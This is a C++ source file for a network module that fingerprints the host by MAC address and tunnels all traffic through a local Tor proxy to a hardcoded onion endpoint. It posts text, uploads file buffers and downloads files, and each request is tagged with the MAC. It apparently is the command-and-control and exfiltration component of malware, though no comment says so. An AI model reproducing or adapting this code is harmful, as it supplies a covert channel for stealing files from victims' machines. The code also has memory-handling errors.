#include "stdafx.h"
#include "Network.h"
#include "Settings.h"
#include "Util.h"
#include "Tor.h"
#include <IPHlpApi.h>
#include <curl\curl.h>
#include "External\http.h"

struct http_response
{
	int code;
	std::string body;
};

/* Some functions you have to supply tinyhttp to get it working */
static void *response_realloc(void *opaque, void *ptr, int size)
{
	return realloc(ptr, size);
}

static void response_body(void *opaque, const char *data, int size)
{
	http_response *r = (http_response *)opaque;
	r->body.insert(r->body.end(), data, data + size);
}

static void response_header(void *opaque, const char *ckey, int nkey, const char *cvalue, int nvalue)
{
}

static void response_code(void *opaque, int code)
{
	http_response *r = (http_response *)opaque;
	r->code = code;
}

static const http_funcs response_funcs = {
	response_realloc,
	response_body,
	response_header,
	response_code
};

Network network;

Network::Network()
{
	curl_global_init(CURL_GLOBAL_ALL);

	/* Get MAC address */
	IP_ADAPTER_INFO adapterInfo[16];
	DWORD bufLen = sizeof(adapterInfo);

	DWORD status = GetAdaptersInfo(adapterInfo, &bufLen);
	if(status != ERROR_SUCCESS) {
		VError(L"GetAdaptersInfo failed!\n");
		return;
	}

	/* Put MAC address into macAddrDataStr */
	char buffer[16] = { 0 };
	for(int i = 0; i < 6; i++) {
		sprintf(buffer, "%02X", adapterInfo[0].Address[i]);
		macAddrDataStr += buffer;
	}
}

Network::~Network()
{
	curl_global_cleanup();
}

size_t CURLWriteToString(void *ptr, size_t size, size_t count, void *stream) {
	size_t dataSize = size * count;
	((std::string *)stream)->append((char *)ptr, 0, dataSize);
	return dataSize;
}

bool InitCURLTorProxy(CURL *curl) {
	CURLcode status;

	status = curl_easy_setopt(curl, CURLOPT_PROXY, "127.0.0.1:9050");
	if(status != CURLE_OK) {
		VError(L"Couldn't init proxy: %u\n", status);
		return false;
	}

	status = curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5_HOSTNAME);
	status = curl_easy_setopt(curl, CURLOPT_HEADER, 1);
	status = curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);

	return true;
}

bool Network::Send(const char *req_method, const char *req_url, const char *req_type,
					size_t req_num_parts, size_t *req_data_len, const char **req_data,
					size_t *resp_len, char **resp_data)
{
	std::string macAddrPost = "&mac=" + macAddrDataStr;
	size_t req_len = macAddrPost.size();
	for (size_t i = 0; i < req_num_parts; i++)
		req_len += req_data_len[i];

	CURL *curl;
	CURLcode status;

	curl = curl_easy_init();

	if(!InitCURLTorProxy(curl)) {
		return false;
	}

	const char *url = "http://" V_NET_DOMAIN_ONION V_NET_BASE "p.php";
	status = curl_easy_setopt(curl, CURLOPT_URL, url);

	char *req_post_data = new char[req_len];
	size_t s = 0;
	for(size_t i = 0; i < req_num_parts; i++) {
		memcpy(&req_post_data[s], req_data[i], req_data_len[i]);
		s += req_data_len[i];
	}

	memcpy(&req_post_data[s], macAddrPost.c_str(), macAddrPost.size());

	std::string response;

	status = curl_easy_setopt(curl, CURLOPT_POSTFIELDS, req_post_data);

	status = curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CURLWriteToString);
	status = curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

	status = curl_easy_perform(curl);
	if(status != CURLE_OK) {
		VError(L"Failed to post: %u\n", status);
		delete req_post_data;
		return false;
	}

	delete req_post_data;
	curl_easy_cleanup(curl);

	if(response == "") {
		return true;
	}

	if(resp_len == nullptr || resp_data == nullptr) {
		return true;
	}

	http_response r;
	r.code = 0;

	http_roundtripper rt;
	http_init(&rt, response_funcs, &r);

	int read = 0;
	http_data(&rt, response.c_str(), response.size(), &read);

	*resp_data = (char *)malloc(r.body.size());
	memcpy(*resp_data, r.body.c_str(), r.body.size());
	*resp_len = r.body.size();

	return true;
}

bool Network::SendFile(const char* req_url, size_t file_size, const char *file)
{
	CURL *curl = curl_easy_init();
	CURLcode status;
	if(!InitCURLTorProxy(curl)) {
		return false;
	}

	curl_httppost *formpost = NULL;
	curl_httppost *lastptr = NULL;
	curl_slist *headerlist = NULL;

	curl_formadd(	&formpost,
					&lastptr,
					CURLFORM_COPYNAME, "s",
					CURLFORM_BUFFER, "1",
					CURLFORM_BUFFERPTR, file,
					CURLFORM_BUFFERLENGTH, file_size,
					CURLFORM_END);

	curl_formadd(	&formpost,
					&lastptr,
					CURLFORM_COPYNAME, "mac",
					CURLFORM_COPYCONTENTS, macAddrDataStr.c_str(),
					CURLFORM_END);

	const char *url = "http://" V_NET_DOMAIN_ONION V_NET_BASE "p.php";
	status = curl_easy_setopt(curl, CURLOPT_URL, url);

	headerlist = curl_slist_append(headerlist, "Expect:");
	status = curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerlist);
	status = curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);

	std::string response;

	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CURLWriteToString);
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

	status = curl_easy_perform(curl);
	if(status != CURLE_OK) {
		VError(L"Failed curl post");
		return false;
	}

	curl_easy_cleanup(curl);
	curl_formfree(formpost);
	curl_slist_free_all(headerlist);

	return true;
}
bool Network::SendAndGetTextA(const char* req_url, const char *text, size_t *resp_len, char **resp_data)
{
	size_t req_data_len[1] = {
		strlen(text)
	};
	const char* req_data[1] = {
		text
	};

	return this->Send(
		"POST", req_url, "application/x-www-form-urlencoded",
		1, req_data_len, req_data,
		resp_len, resp_data);
}
bool Network::SendAndGetTextW(const char* req_url, const wchar_t *text, size_t *resp_len, wchar_t **resp_data)
{
	char *text_mb = Util::w2mb(text, wcslen(text));
	size_t resp_len_mb;
	char *resp_data_mb;

	size_t *a;
	char **b;

	if (resp_len == nullptr || resp_data == nullptr) {
		a = nullptr;
		b = nullptr;
	}
	else {
		a = &resp_len_mb;
		b = &resp_data_mb;
	}

	bool ret = this->SendAndGetTextA(req_url, text_mb, a, b);

	free(text_mb);

	if (ret && a && b)
	{
		*resp_data = Util::mb2w(resp_data_mb, resp_len_mb);
		*resp_len = wcslen(*resp_data);
		free(resp_data_mb);
	}
	return ret;
}
bool Network::SendTextA(const char* req_url, const char *text)
{
	return this->SendAndGetTextA(req_url, text, nullptr, nullptr);
}
bool Network::SendTextW(const char* req_url, const wchar_t *text)
{
	char *text_mb = Util::w2mb(text, wcslen(text));
	bool ret = this->SendTextA(req_url, text_mb);
	free(text_mb);
	return ret;
}
bool Network::GetFile(const char* req_url, size_t *resp_len, char **resp_data)
{
	return this->Send(
		"GET", req_url, "application/x-www-form-urlencoded",
		0, nullptr, nullptr,
		resp_len, resp_data);
}